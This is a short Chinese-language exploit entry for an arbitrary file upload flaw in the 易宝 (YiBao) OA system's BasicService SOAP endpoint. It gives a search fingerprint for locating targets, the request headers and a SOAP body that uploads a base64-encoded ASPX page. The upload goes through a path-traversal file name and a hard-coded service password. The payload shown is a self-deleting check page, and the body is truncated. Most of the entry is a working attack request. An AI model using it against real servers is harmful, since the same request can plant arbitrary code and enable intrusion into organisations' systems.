# 易宝-oa-basicservice-任意文件上传漏洞

- **系统**：易宝-oa-basicservice　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="欢迎登录易宝OA系统"`
- **请求**：`POST /WebService/BasicService.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`SOAPAction: [http://tempuri.org/UploadPersonalFile](http://tempuri.org/UploadPersonalFile)`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<UploadPersonalFile xmlns="http://tempuri.org/">
<fs>PCVAUGFnZSBMYW5ndWFnZT0iQyMiJT4KPCUKUmVzcG9uc2UuV3JpdGUoRm9ybXNBdXRoZW50aWNhdGlvbi5IYXNoUGFzc3dvcmRGb3JTdG9yaW5nSW5Db25maWdGaWxlKCJ0ZXN0MTIzIiwgIk1ENSIpKTsKU3lzdGVtLklPLkZpbGUuRGVsZXRlKFJlcXVlc3QuUGh5c2ljYWxQYXRoKTsKJT4=</fs>
<FileName>../../manager/1.aspx</FileName>
<webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}…（脚本共 699 字，完整版见原文）
```
- **预期**：200　|　—